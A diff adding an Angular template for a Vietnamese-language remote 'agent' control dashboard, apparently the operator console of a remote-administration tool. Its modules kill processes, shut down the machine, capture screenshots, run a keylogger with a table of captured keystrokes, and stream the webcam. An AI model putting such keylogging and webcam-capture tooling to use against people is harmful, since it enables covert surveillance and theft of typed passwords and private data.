@@ -1,0 +1,259 @@
+<!-- ======================== LOADING ========================= -->
+<ng-template #loadingTpl>
+  <div class="page">
+    <h3>Đang tải...</h3>
+  </div>
+</ng-template>
+
+<!-- ======================== MAIN PAGE ======================== -->
+<div class="page" *ngIf="!loading(); else loadingTpl">
+
+  <!-- HEADER -->
+  <h1>Điều khiển Agent: {{ agent?.machineId }}</h1>
+  <div class="subtitle">Bảng điều khiển realtime – giao diện hiện đại</div>
+
+  <!-- =================== TOP INFO =================== -->
+  <div class="grid-2">
+
+    <!-- LEFT CARD -->
+    <section class="card">
+      <h2>Thông tin Agent</h2>
+
+      <div><b>Machine ID:</b> {{ agent?.machineId }}</div>
+      <div><b>IP:</b> {{ agent?.ip }}</div>
+      <div><b>OS:</b> {{ agent?.os }}</div>
+      <div><b>WS Port:</b> {{ agent?.wsPort }}</div>
+
+      <div style="margin-top:10px;">
+        <b>Registry trạng thái:</b>
+        <span class="status-pill" [ngClass]="agent?.online ? 'pill-online' : 'pill-offline'">
+          ● {{ agent?.online ? 'Online' : 'Offline' }}
+        </span>
+      </div>
+
+      <button class="btn" style="margin-top:14px;" (click)="connectWS()" [disabled]="!agent?.online">
+        🔌 Kết nối WebSocket
+      </button>
+    </section>
+
+    <!-- RIGHT CARD -->
+    <section class="card">
+      <h2>WebSocket</h2>
+
+      <div><b>Status:</b> {{ ws.status() }}</div>
+
+     
+    </section>
+
+  </div>
+
+  <!-- =================== MODULE MENU =================== -->
+  <section class="card modules-card">
+
+    <h2>Modules</h2>
+
+    <!-- MENU -->
+    <div *ngIf="!selectedModule()">
+      <div class="module-grid">
+        <button class="module-btn" (click)="openModule('PROCESS')">🔧 PROCESS</button>
+        <button class="module-btn" (click)="openModule('SYSTEM')">💻 SYSTEM</button>
+        <button class="module-btn" (click)="openModule('SCREEN')">🖼 SCREEN</button>
+        <button class="module-btn" (click)="openModule('APP')">📂 APPS</button>
+        <button class="module-btn" (click)="openModule('KEYLOGGER')">⌨ KEYLOGGER</button>
+        <button class="module-btn" (click)="openModule('WEBCAM')">📷 WEBCAM</button>
+      </div>
+    </div>
+
+    <!-- ========== PROCESS MANAGER ========== -->
+    <div *ngIf="selectedModule() === 'PROCESS'" class="section-card">
+      <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+
+      <h3 class="section-title">🔧 Process Manager</h3>
+
+      <div class="btn-bar">
+        <button class="btn" (click)="sendProcessList()">📋 LIST</button>
+        <button class="btn btn-danger" (click)="sendProcessKill()">🗑 KILL</button>
+        <button class="btn" (click)="sendProcessStart()">➕ START…</button>
+      </div>
+
+      <table *ngIf="processList().length">
+        <thead>
+          <tr>
+            <th>PID</th>
+            <th>Name</th>
+            <th>Threads</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr *ngFor="let p of processList()">
+            <td>{{ p.pid }}</td>
+            <td>{{ p.name }}</td>
+            <td>{{ p.threads }}</td>
+            <td>
+              <button class="btn btn-danger" (click)="killProcess(p.pid)">KILL</button>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div *ngIf="!processList().length" class="placeholder">
+        Chưa có dữ liệu – bấm LIST để load thông tin.
+      </div>
+    </div>
+
+    <!-- ========== SYSTEM CONTROL ========== -->
+    <div *ngIf="selectedModule() === 'SYSTEM'" class="section-card">
+      <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+
+      <h3 class="section-title">💻 System Control</h3>
+
+      <div class="btn-bar">
+        <button class="btn btn-danger" (click)="sendSystemShutdown()">Shutdown</button>
+        <button class="btn btn-danger" (click)="sendSystemRestart()">Restart</button>
+        <!-- <button class="btn" (click)="sendSystemLogoff()">Logoff</button>
+        <button class="btn" (click)="sendSystemLock()">Lock</button> -->
+      </div>
+    </div>
+
+    <!-- ========== SCREENSHOT ========== -->
+    <div *ngIf="selectedModule() === 'SCREEN'" class="section-card">
+      <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+      <h3 class="section-title">🖼 Screenshot</h3>
+
+      <div class="btn-bar">
+        <button class="btn" (click)="sendScreenCaptureBinary()">📷 Capture</button>
+        <button class="btn btn-secondary" (click)="clearScreenshot()">Clear</button>
+      </div>
+
+      <div class="screen-preview">
+        <ng-container *ngIf="screenshot() as shot; else noScreen">
+          <img [src]="shot" alt="Screenshot" />
+        </ng-container>
+
+        <ng-template #noScreen>
+          <div class="placeholder">Chưa có screenshot</div>
+        </ng-template>
+      </div>
+    </div>
+
+    <!-- ========== APP MANAGER ========== -->
+    <div *ngIf="selectedModule() === 'APP'" class="section-card">
+      <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+      <h3 class="section-title">📂 App Manager</h3>
+
+      <div class="btn-bar">
+        <button class="btn" (click)="sendAppList()">📋 LIST</button>
+        <button class="btn" (click)="sendAppStart()">➕ START…</button>
+      </div>
+
+      <!-- <table *ngIf="appList().length">
+        <thead>
+          <tr>
+            <th>ID</th>
+            <th>Name</th>
+            <th>Path</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr *ngFor="let a of appList()">
+          <td>{{ a.exe }}</td>
+<td>{{ a.count }}</td>
+<td>{{ a.exe }}</td>
+          </tr>
+        </tbody>
+      </table> -->
+      <table *ngIf="appList().length">
+  <thead>
+    <tr>
+      <th>NAME</th>
+      <th>ACTION</th>
+    </tr>
+  </thead>
+
+  <tbody>
+    <tr *ngFor="let app of appList()">
+      <td>{{ app.exe }}</td>
+
+      <td>
+        <button class="btn btn-danger" (click)="killApp(app.exe)">KILL</button>
+      </td>
+    </tr>
+  </tbody>
+</table>
+
+      <div *ngIf="!appList().length" class="placeholder">
+        Bấm LIST để tải danh sách ứng dụng.
+      </div>
+    </div>
+
+    <!-- ========== KEYLOGGER ========== -->
+    <div *ngIf="selectedModule() === 'KEYLOGGER'" class="section-card">
+      <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+
+      <h3 class="section-title">⌨ Keylogger</h3>
+
+      <div class="btn-bar">
+        <button class="btn" (click)="sendKeyloggerStart()">Start</button>
+        <button class="btn btn-danger" (click)="sendKeyloggerStop()">Stop</button>
+        <button class="btn-blue" (click)="clearKeylogs()">CLEAR</button>
+      </div>
+
+      <table *ngIf="ws.keylogList().length">
+        <thead>
+          <tr>
+            <th>ID</th>
+            <th>Time</th>
+            <th>Text</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr *ngFor="let k of ws.keylogList()">
+            <td>{{ k.id }}</td>
+            <td>{{ k.timestamp }}</td>
+            <td>{{ k.text }}</td>
+          </tr>
+        </tbody>
+      </table>
+        <!-- HIỂN THỊ DẠNG TEXTAREA GIỐNG MẪU -->
+  <!-- <textarea 
+      class="keylog-textarea"
+      readonly
+      *ngIf="ws.keylogList().length">
+    {{keylogString() }}
+  </textarea> -->
+
+
+      <div *ngIf="!ws.keylogList().length" class="placeholder">
+        <!-- Chưa có log. -->
+         <div id="keylog-box" class="keylog-output">
+            Chưa có log.
+          </div>
+
+      </div>
+    </div>
+
+    <!-- ========== WEBCAM STREAM ========== -->
+    <div *ngIf="selectedModule() === 'WEBCAM'" class="section-card">
+      <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+
+      <h3 class="section-title">📷 Webcam Stream</h3>
+
+      <div class="btn-bar">
+        <button class="btn" (click)="sendWebcamStartStream()">▶ Start Stream</button>
+        <button class="btn btn-danger" (click)="sendWebcamStopStream()">⏹ Stop</button>
+      </div>
+
+      <div class="webcam-preview">
+        <ng-container *ngIf="webcamFrame() as frame; else noCam">
+          <img [src]="frame" />
+        </ng-container>
+
+        <ng-template #noCam>
+          <div class="placeholder">Không có stream.</div>
+        </ng-template>
+      </div>
+    </div>
+
+  </section>
+
+</div>
